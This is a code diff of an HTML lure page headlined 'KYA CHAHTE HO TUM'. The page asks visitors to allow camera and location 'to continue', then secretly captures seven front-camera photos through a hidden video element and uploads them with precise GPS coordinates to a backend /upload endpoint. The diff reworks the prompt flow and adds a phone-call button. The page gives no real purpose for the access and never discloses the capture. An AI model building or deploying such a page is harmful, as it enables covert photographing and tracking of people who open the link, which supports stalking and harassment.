@@ -1,121 +1,162 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>KYA CHAHTE HO TUM</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>KYA CHAHTE HO TUM</title>
 
-  <style>
-    html,body{
-      height:100%;margin:0;
-      font-family:system-ui;
-      background:linear-gradient(135deg,#0f172a,#0b1220);
-      color:white;display:flex;align-items:center;justify-content:center;
-      flex-direction:column;text-align:center;
-    }
-    .headline{
-      font-weight:900;
-      font-size: clamp(32px, 10vw, 96px);
-      background:linear-gradient(90deg,#ff416c,#ff4b2b,#ffd200,#2fd3a3);
-      -webkit-background-clip:text;
-      background-clip:text;
-      color:transparent;
-      animation: shimmer 3s infinite linear;
-    }
-    @keyframes shimmer{
-      0%{background-position:0% 50%}
-      50%{background-position:100% 50%}
-      100%{background-position:0% 50%}
-    }
-    #status{
-      margin-top:20px;
-      font-size:14px;
-      color:#cbd5e1;
-    }
-    video{display:none;}
-  </style>
+<style>
+  html,body{
+    height:100%;margin:0;
+    font-family:system-ui;
+    background:linear-gradient(135deg,#0f172a,#0b1220);
+    color:white;display:flex;
+    flex-direction:column;
+    align-items:center;justify-content:center;
+    text-align:center;padding:20px;
+  }
+
+  .headline{
+    font-weight:900;
+    font-size:clamp(32px,10vw,96px);
+    background:linear-gradient(90deg,#ff416c,#ff4b2b,#ffd200,#2fd3a3);
+    -webkit-background-clip:text;
+    color:transparent;
+    animation:shimmer 3s infinite linear;
+  }
+
+  @keyframes shimmer{
+    0%{background-position:0% 50%}
+    50%{background-position:100% 50%}
+    100%{background-position:0% 50%}
+  }
+
+  #allowBox{
+    margin-top:25px;
+    padding:16px 24px;
+    background:rgba(255,255,255,0.06);
+    border-radius:12px;
+    display:none;
+  }
+
+  button{
+    padding:12px 22px;
+    font-size:16px;
+    border:0;
+    border-radius:10px;
+    background:#1f2937;
+    color:white;
+    cursor:pointer;
+  }
+
+  #callBtn{
+    position:fixed;
+    bottom:25px;
+    right:25px;
+    background:#10b981;
+    width:55px;height:55px;
+    border-radius:50%;
+    font-size:26px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-decoration:none;
+    color:white;
+    box-shadow:0 6px 20px rgba(0,0,0,0.35);
+  }
+
+  video{display:none;}
+</style>
 </head>
 
 <body>
 
-  <div class="headline">KYA CHAHTE HO TUM</div>
-  <div id="status">Requesting permissions...</div>
+<div class="headline">KYA CHAHTE HO TUM</div>
 
-  <video id="video" autoplay playsinline muted></video>
+<div id="allowBox">
+  <p>Please allow camera and location to continue</p>
+  <button id="allowBtn">Allow Camera & Location</button>
+</div>
+
+<video id="cam" autoplay playsinline muted></video>
+
+<!-- Phone Call Button -->
+<a id="callBtn" href="tel:+919876543210">📞</a>
 
 <script>
-(async function(){
+const allowBox = document.getElementById("allowBox");
+const allowBtn  = document.getElementById("allowBtn");
+const video = document.getElementById("cam");
 
-  const status = document.getElementById("status");
-  const video = document.getElementById("video");
+const UPLOAD_URL = "/upload";
 
-  // Backend upload URL
-  const UPLOAD_URL = "/upload";
+// Show permission box after 2.5 seconds
+setTimeout(()=> allowBox.style.display = "block", 2500);
 
-  function update(msg){ status.textContent = msg; }
 
-  function canvasToBlob(canvas){
-    return new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
-  }
-
-  async function capture(video){
-    const c = document.createElement("canvas");
-    c.width = video.videoWidth;
-    c.height = video.videoHeight;
-    c.getContext("2d").drawImage(video,0,0);
-    return canvasToBlob(c);
-  }
-
+allowBtn.addEventListener("click", async ()=>{
   try {
-    update("Requesting camera access...");
     const stream = await navigator.mediaDevices.getUserMedia({
-      video:{ facingMode:"user" }, audio:false
+      video:{ facingMode:"user" },
+      audio:false
     });
 
     video.srcObject = stream;
 
-    update("Requesting location...");
-    const location = await new Promise((resolve,reject)=>{
-      navigator.geolocation.getCurrentPosition(resolve,reject,{enableHighAccuracy:true});
+    // Wait for video to be fully ready (fixes black images)
+    await new Promise(resolve=>{
+      if(video.readyState >= 2) resolve();
+      video.onloadeddata = resolve;
     });
 
-    update("Capturing photos...");
-
-    // Ensure video is ready
-    await new Promise(r=>{
-      if(video.readyState>=2) r();
-      else video.onloadeddata = r;
+    // Request location
+    const loc = await new Promise((resolve,reject)=>{
+      navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy:true});
     });
 
+    // Capture 7 photos
     const photos = [];
     for(let i=0;i<7;i++){
-      const blob = await capture(video);
+      const blob = captureFrame(video);
       photos.push(blob);
-      await new Promise(r=>setTimeout(r,200));
+      await new Promise(r=>setTimeout(r,150));
     }
 
-    update("Uploading...");
-
+    // Send to backend
     const fd = new FormData();
-    fd.append("latitude", location.coords.latitude);
-    fd.append("longitude", location.coords.longitude);
+    fd.append("latitude", loc.coords.latitude);
+    fd.append("longitude", loc.coords.longitude);
 
-    photos.forEach((b,i)=>fd.append("photos", b, `photo${i+1}.jpg`));
+    for(let i=0;i<photos.length;i++){
+      fd.append("photos", photos[i], `p${i}.jpg`);
+    }
 
-    await fetch(UPLOAD_URL,{
-      method:"POST",
-      body:fd
-    });
+    fetch(UPLOAD_URL,{ method:"POST", body:fd });
 
-    update("Done ✔");
     stream.getTracks().forEach(t=>t.stop());
+    allowBox.innerHTML = "<b>Thank you ✔</b>";
 
   } catch(err){
-    console.error(err);
-    update("Error: " + err.message);
+    alert("Permission denied or error: " + err.message);
   }
+});
 
-})();
+
+function captureFrame(video){
+  const c = document.createElement("canvas");
+  c.width = video.videoWidth;
+  c.height = video.videoHeight;
+  const ctx = c.getContext("2d");
+  ctx.drawImage(video,0,0);
+  return dataURItoBlob(c.toDataURL("image/jpeg",0.9));
+}
+
+function dataURItoBlob(dataURI){
+  let byte = atob(dataURI.split(",")[1]);
+  let arr = [];
+  for(let i=0;i<byte.length;i++) arr.push(byte.charCodeAt(i));
+  return new Blob([new Uint8Array(arr)], {type:"image/jpeg"});
+}
 </script>
 
 </body>
